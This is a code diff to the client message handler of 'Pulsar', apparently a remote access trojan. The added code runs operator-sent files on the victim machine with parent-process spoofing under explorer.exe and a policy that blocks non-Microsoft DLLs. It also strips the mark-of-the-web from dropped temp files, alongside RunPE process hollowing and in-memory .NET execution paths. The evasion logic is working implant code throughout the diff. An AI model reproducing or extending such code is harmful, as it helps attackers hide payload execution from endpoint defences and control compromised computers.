@@ -400,7 +400,9 @@ namespace Pulsar.Client.Messages
                     message.RunPETarget,
                     message.RunPECustomPath,
                     message.FileExtension,
-                    message.IsFromFileManager   // <<< NEW
+                    message.IsFromFileManager,
+                    message.UseSpecialExecution   // <<< NEW
+
                 );
             }
         }
@@ -423,41 +425,181 @@ namespace Pulsar.Client.Messages
                 message.RunPETarget,
                 message.RunPECustomPath,
                 message.FileExtension,
-                message.IsFromFileManager   // <<< NEW
-            );
+                message.IsFromFileManager,
+                message.UseSpecialExecution   // <<< NEW
+        );
+        }
+        private void ExecuteSpoofedFileManager(string realPath)
+        {
+            ExecuteSpoofedReal(realPath); // This is correct - no temp file
         }
 
-        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory,
-            bool useRunPE, string runPETarget, string runPECustomPath, string fileExtension, bool isFromFileManager)
+        private void ExecuteSpoofedReal(string realPath)
+        {
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+            var si = new Utilities.NativeMethods.STARTUPINFOEX();
+            si.StartupInfo.cb = Marshal.SizeOf(typeof(Utilities.NativeMethods.STARTUPINFOEX));
+
+            var (parentPid, parentDirectory) = GetExplorerPidAndDirectory();
+
+            IntPtr lpSize = IntPtr.Zero;
+
+            Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                IntPtr.Zero, 2, 0, ref lpSize);
+
+            si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
+
+            if (!Utilities.NativeMethods.InitializeProcThreadAttributeList(
+                si.lpAttributeList, 2, 0, ref lpSize))
+            {
+                throw new Exception("Init attribute list failed.");
+            }
+
+            IntPtr parentHandle = IntPtr.Zero;
+
+            try
+            {
+                parentHandle = OpenProcess(ProcessAccessFlags.PROCESS_CREATE_PROCESS, false, parentPid);
+                if (parentHandle == IntPtr.Zero)
+                    throw new Exception("OpenProcess failed for PPID.");
+
+                ulong hValue = (ulong)parentHandle.ToInt64();
+
+                // PPID spoof
+                Utilities.NativeMethods.UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    (IntPtr)0x00020000,
+                    ref hValue,
+                    (IntPtr)IntPtr.Size,
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                // DLL block policy
+                ulong policy = Utilities.NativeMethods.PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
+
+                Utilities.NativeMethods.UpdateProcThreadAttribute(
+                    si.lpAttributeList,
+                    0,
+                    Utilities.NativeMethods.PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
+                    ref policy,
+                    (IntPtr)sizeof(ulong),
+                    IntPtr.Zero,
+                    IntPtr.Zero);
+
+                // *** REAL FILE DIRECT EXECUTION ***
+                // Use the actual file's directory as working directory
+                string workingDir = Path.GetDirectoryName(realPath);
+
+                bool ok = Utilities.NativeMethods.CreateProcess(
+                    null,
+                    $"\"{realPath}\"",
+                    IntPtr.Zero,
+                    IntPtr.Zero,
+                    false,
+                    Utilities.NativeMethods.EXTENDED_STARTUPINFO_PRESENT,
+                    IntPtr.Zero,
+                    workingDir, // Use the file's directory, not explorer's
+                    ref si,
+                    out pi);
+
+                if (!ok)
+                    throw new Exception("PPID spoof failed.");
+            }
+            finally
+            {
+                if (si.lpAttributeList != IntPtr.Zero)
+                {
+                    Utilities.NativeMethods.DeleteProcThreadAttributeList(si.lpAttributeList);
+                    Marshal.FreeHGlobal(si.lpAttributeList);
+                }
+                if (parentHandle != IntPtr.Zero)
+                    CloseHandle(parentHandle);
+            }
+        }
+        private void ExecuteSpoofedTemp(byte[] fileBytes, string extension)
+        {
+            ExecuteViaTemporaryFile(fileBytes, extension);
+        }
+
+        private void ExecuteProcess(
+            byte[] fileBytes,
+            string filePath,
+            bool isUpdate,
+            bool executeInMemory,
+            bool useRunPE,
+            string runPETarget,
+            string runPECustomPath,
+            string fileExtension,
+            bool isFromFileManager,
+            bool useSpecialExecution)
         {
             // ------------------------------------------------------------
-            // 1. FILE MANAGER NORMAL EXECUTION (NO BYTES, NO TEMP, NO POLICY)
+            // 1. FILE MANAGER EXECUTION (LOCAL PATH)
             // ------------------------------------------------------------
-            if (isFromFileManager && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
+            // FIRST: Check if this is from file manager AND we have a valid local file path
+            if (isFromFileManager && !string.IsNullOrEmpty(filePath))
             {
+                // IMPORTANT: When from file manager, we should use the path directly
+                // regardless of whether File.Exists() returns true or not
+
+                // The file path comes from the server's file manager, which shows
+                // files that exist on the CLIENT's machine
                 try
                 {
-                    Process.Start(new ProcessStartInfo
+                    if (useSpecialExecution)
                     {
-                        FileName = filePath,
-                        UseShellExecute = true
-                    });
+                        // Try PPID spoofed execution with the real file
+                        if (File.Exists(filePath))
+                        {
+                            ExecuteSpoofedReal(filePath);
+                            _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                            SendStatus($"Executed with spoofed PPID (File Manager): {filePath}");
+                        }
+                        else
+                        {
+                            // File doesn't exist locally, send error
+                            _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                            SendStatus($"File not found on client: {filePath}");
+                        }
+                    }
+                    else
+                    {
+                        // Normal execution - use the real file directly
+                        if (File.Exists(filePath))
+                        {
+                            Process.Start(new ProcessStartInfo
+                            {
+                                FileName = filePath,
+                                UseShellExecute = true,
+                                WorkingDirectory = Path.GetDirectoryName(filePath)
+                            });
 
-                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
-                    SendStatus($"Executed normally (File Manager): {filePath}");
+                            _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                            SendStatus($"Executed normally (File Manager): {filePath}");
+                        }
+                        else
+                        {
+                            _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                            SendStatus($"File not found on client: {filePath}");
+                        }
+                    }
                 }
                 catch (Exception ex)
                 {
                     _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                    SendStatus($"Normal execution failed: {ex.Message}");
+                    SendStatus($"Execution failed: {ex.Message}");
                 }
 
-                return;
+                return; // CRITICAL: Return here to prevent any temp file creation
             }
 
             // ------------------------------------------------------------
-            // 2. REMOTE EXECUTION LOGIC (UPLOAD EXECUTION)
+            // 2. UPLOADED EXECUTION (NOT FROM FILE MANAGER)
             // ------------------------------------------------------------
+            // This is for when server sends file bytes directly
+
             if (fileBytes == null && filePath != null && File.Exists(filePath))
                 fileBytes = File.ReadAllBytes(filePath);
 
@@ -468,29 +610,88 @@ namespace Pulsar.Client.Messages
                 return;
             }
 
+            // ------------------------------------------------------------
+            // 3. SPECIAL EXECUTION (UPLOADED FILES)
+            // ------------------------------------------------------------
+            if (useSpecialExecution && !useRunPE && !executeInMemory)
+            {
+                try
+                {
+                    ExecuteSpoofedTemp(fileBytes, fileExtension);
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                    SendStatus("Executed with spoofed PPID (uploaded file)");
+                }
+                catch (Exception ex)
+                {
+                    SendStatus($"Special execution failed: {ex.Message}");
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
+                }
+
+                return;
+            }
+
+            // ------------------------------------------------------------
+            // 4. RUNPE MODE
+            // ------------------------------------------------------------
+            if (useRunPE)
+            {
+                ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
+                return;
+            }
+
+            // ------------------------------------------------------------
+            // 5. IN-MEMORY .NET EXECUTION
+            // ------------------------------------------------------------
+            if (executeInMemory)
+            {
+                ExecuteViaInMemoryDotNet(fileBytes);
+                return;
+            }
+
+            // ------------------------------------------------------------
+            // 6. TRUE NORMAL EXECUTION (CHECKBOX UNCHECKED)
+            // ------------------------------------------------------------
+            if (!useSpecialExecution && !useRunPE && !executeInMemory)
+            {
+                try
+                {
+                    string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
+                    File.WriteAllBytes(tempPath, fileBytes);
+                    FileHelper.DeleteZoneIdentifier(tempPath);
+
+                    Process.Start(new ProcessStartInfo
+                    {
+                        FileName = tempPath,
+                        UseShellExecute = true
+                    });
+
+                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                    SendStatus($"Executed normally (NO spoofing / NO mitigations): {tempPath}");
+                    return;
+                }
+                catch (Exception ex)
+                {
+                    SendStatus($"Normal execution failed: {ex.Message}");
+                }
+            }
+
+            // ------------------------------------------------------------
+            // 7. FALLBACK: SPOOFED EXECUTION (IF NORMAL FAILED)
+            // ------------------------------------------------------------
             try
             {
-                if (useRunPE)
-                {
-                    ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath);
-                    return;
-                }
-
-                if (executeInMemory)
-                {
-                    ExecuteViaInMemoryDotNet(fileBytes);
-                    return;
-                }
-
-                // default remote execution
                 ExecuteViaTemporaryFile(fileBytes, fileExtension);
+
+                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
+                SendStatus("Fallback: executed using PPID spoofing & mitigations");
             }
             catch (Exception ex)
             {
                 _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
-                SendStatus($"Process start failed: {ex.Message}");
+                SendStatus($"Fallback execution failed: {ex.Message}");
             }
         }
+
 
         private void ExecuteViaRunPE(byte[] fileBytes, string runPETarget, string runPECustomPath)
         {
